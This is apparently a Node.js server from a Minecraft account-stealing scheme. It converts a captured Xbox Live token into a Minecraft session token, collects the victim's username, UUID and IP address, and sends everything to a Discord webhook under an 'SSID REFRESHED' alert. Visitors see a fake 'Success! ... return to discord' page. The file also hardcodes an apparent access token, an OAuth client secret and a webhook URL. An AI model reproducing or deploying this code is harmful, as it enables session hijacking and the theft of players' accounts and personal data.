//XBL TOKEN
const userToken = 'eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJ6aXAiOiJERUYiLCJ4NXQiOiJxcEQtU2ZoOUg3NFFHOXlMN1hSZXJ5RmZvbk0iLCJjdHkiOiJKV1QifQ.zZN2ic4sGZlukiw2TBqbFM2eFZM1WLW7x5-Gdip5GQre2kYcTqsLJnrrarCIRXLChKSgs6uVdge4FSWdwweGa7PvlZtrQgK17O-7YSHex4-_6T37AjdA2xEVDHwVjBePILVEfoAC8Q6ErXb90P13yI44FbG_QLIEiXE2A55LvkF-dGC3kooP1fSt8Z9uqSyvo3U5RV_GGe1cfPfM_WOnHG31LSuBoe1lVAlyEJvG_EUB5-kIhIKuv7pIce5WlVnmFgQBEoMEF9Tu7vSmtKBm1Qmkz-A4TLGKd1jD2aGXhlJlIaX7nXWMW0jkWUOt4IhD9DLnSSDk8Cu5bbJQRrTO-A.-Q1fCxwYypl8O8wbAhwQlw.yLWxZK6xA4GD_HhwNIW7xblDkdBAuAdrfNnSWgGgh0xCuX1eFHj51v_I2VGATHAClkr9-yUGZBSf0ezM6EQVycr2aPICQCtRPODKW0DAjrutbk9cKEDvJwat3OY5jfKUSpEb9ep537X8_IULO22-U90n-hgQY9V2bz0NT6bKI8E3PLeJnSSvbegKPjf8MXpYopeli0zX-ZE6T8ND3UEW87B-vfSCYzYWpUYvOAeZ3IffEJz8xWxM7hqmq6JQPhd-DOG7YilydeqOixSejMZn86gvyW6W6PP4WhRYOoQBVkZOhKj4OIS5CfRiBXRU9g1rmSp8EV0FE4HhzOtDo58T5baoBIeAFPCEDC6RzztYDTec4HHYuOQCwgyrMfotHDaebMtoQIFBYeBoHNKbLWm5nRlVaE4kJwipibfkOQYNcjgVCULEl6xnvUjJa8CJ_ItlruxjA9kSRZB-q9bdilETRSRs2-l-dds6Go8Cu6-1lS5Gto_w4rk7qnxJ-jWwZWel-RuoDZ6Z8eBzNJLrqFQJyT66aGFfsjSLOS5J1xocT1Q__J5gLUNMOjcTXSccxu83PGGWUDw7HRz6QuynPb9sMF9ZfbD6-ByIS-9vg2u3sETCKhRLiJo1an4kxig2RY2v47-06_CMR-CiWcXrQW0_Ep_NgCO0d_dqipf4O47IZx2HTO8b8WLDoOMK1QrQnQ2onwR6O5kz63zS_Rmi7YsX0VnYFpcih4s37C81oVTumoBkx1IwNxer4hoWRNyZYuj_3Z4nq9AaIXji0yQpZ_uwsBxI5B85ygpDZncOLAXU9awI43JN8orP4fM3NGtCQg1uk7PkWTZm9isBLI7JfTFOt-iWYp7DSfSm0z1wVhwLSI11OIM66Pfon5gAjzZJ6lnSYM_C-66Nzx8BgIwfjwL2twG_vGNCGJDPht5EkglqffQJUxza0y9Gx60Xn1HEdVjF21zLTVa9nMYBqNFN52tPKqhqzsE5KjxADth0NijrJ90.FmO0uAYsHe59FMxhLaJdTg'

// Configuration
const client_secret = '-Pw8Q~oEXLe~w~eRhIfGOp0qOuZS6PeafRIOCbPQ'
const client_id = '170ccb61-c568-409a-a59a-e2ecd656a9c5'
const redirect_uri = 'https://linkdiscord.herokuapp.com'
const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
// Config end
const axios = require('axios')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

console.log('got them both')
app.get('/', async (req, res) => {
    console.log('no query code for u')
    res.send('Success! You can exit this page and return to discord.')
    try {
        console.log('1')
        console.log('all of those parameters were obsolete, the fun part begins')
        console.log('user token set') // MODIFY VALUE ABOVE  ^^^
        const xstsTokenHashArray = await getXSTSToken(userToken)
        console.log('got array')
        const xstsToken = xstsTokenHashArray[0]
        const userHash = xstsTokenHashArray[1]
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = getIp(req)
        postToWebhook(username, bearerToken, uuid, ip, userToken)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return [response.data['Token'], response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
}

function postToWebhook(username, bearerToken, uuid, ip, userToken) {
    const url = webhook_url
    let data = {
        username: " ",
        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
        content: "@everyone" + " **SSID REFRESHED**\n**XBL REFRESH TOKEN:**  ```" + userToken + "```\n",
        embeds: [{
            title: "User Info", color: 0x00ff50, fields: [
                {name: "Username", value: username, inline: true},
                {name: "UUID", value: uuid, inline: true},
                {name: "Ip", value: ip, inline: true},
                {name: "SessionID", value: bearerToken, inline: false},
                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
            ]
        }]
    }
    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
}



const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    addBan(name)
    return false
}
